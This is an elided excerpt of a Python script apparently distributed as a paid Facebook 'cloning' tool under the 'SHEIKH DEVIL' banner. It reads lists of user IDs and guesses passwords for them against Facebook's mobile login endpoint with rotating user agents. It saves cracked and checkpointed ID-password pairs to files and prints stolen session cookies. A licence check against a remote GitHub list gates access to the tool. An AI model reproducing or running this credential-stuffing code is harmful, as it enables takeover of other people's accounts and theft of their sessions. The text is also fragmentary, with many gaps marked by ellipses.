...
time.sleep(2)
#os.system('clear')
print("\033[95;1m[\x1b[35;5;50m+\033[97;1m]\x1b[35;5;50m JOIM MY TELEGRAM CHANNEL..!")
...
prinCP=[]
try:
    prox= requests.get('https://github.com/Nirob-vai/Cloning-devil/blob/main/Devil%20-%20aprovel909').text
...
╚═════╝ ╚══════╝  ╚═══╝  ╚═╝╚══════╝                                                              
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 ║\33[0;95m[<🕌Assalamualaikum"Mind It,'You Will Never Devil🕴️>]\033[0;95m║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[1;31m==================================================
[] AUTHOR       :      NIROB 
[] TOOLS        :     𝐅𝐈𝐋𝐄-𝐂𝐋𝐎𝐍𝐈𝐍𝐆
[] TYPE         :      𝗣𝗔𝗜𝗗(𝐔𝐬𝐞𝐫 𝐎𝐧𝐥𝐲)
[] FACEBOOK     :      DEVIL SHEIKH CYBER ZONE
[] VERSION      :      0.1
[] WHATSAPP   :      SHEIKH DEVIL CYBER ZONE
=================================================="\033[1;23m"""                                
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Nirob-vai/Cloning-devil/blob/main/Devil%20-%20aprovel909').text
    if id in httpCaht:
      print(fuckyoursali)
      ...
      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   SHEIKH,   DEVIL,    Please,   Send,   Your,   Key,"')
...
os.system('espeak -a 300 " Welcome,   to,  SHEIKH.DEVIL,  PAID,   Tools"')
def back():
	login()
...
while attemps < 12345677901:
    username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER USERNAME:P ')
    password = input('\033[1;95m[\033[1;95m√\033[1;95m]\x1b[38;5;50m ENTER PASSWORD:3 ')
...
def result():
    ...
    if kz in ['1','01']:
        ...
        if len(vin)==0:
            ...
            for cpku in range(len(lin)):
                cpkuni=lin[nocp].split('|')
                print(f'\033[95;1m[\033[92;1m•\033[95;1m]DEVIL OK💚 : \033[35m {cpkuni[0]}|{cpkuni[1]}\033[0m')
                nocp +=1
            print('\033[0;91m==================')
...
def crack_file():
    ...
    print('\033[1;36m[ Put File Example:  /sdcard/Devil.txt  Etc...]')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;95m{bo}[DEVIL 🔍•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[DEVIL-Cp🌺]✅Uid┏━➤ {idf} 🔑Pass┏━➤{pw}')
                ...
                print(f'\r\033[0;96m[DEVIL-Ok🌸] ✅Uid┏━➤ {idf} 🔑Pass┏━➤ {pw}\n\033[0;91m[🌼]= COOKIES • \033[0;91m{kuki} ')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[DEVIL 🔍-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•DEVIL-Cp] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
                os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•DEVIL-Ok] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
                os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
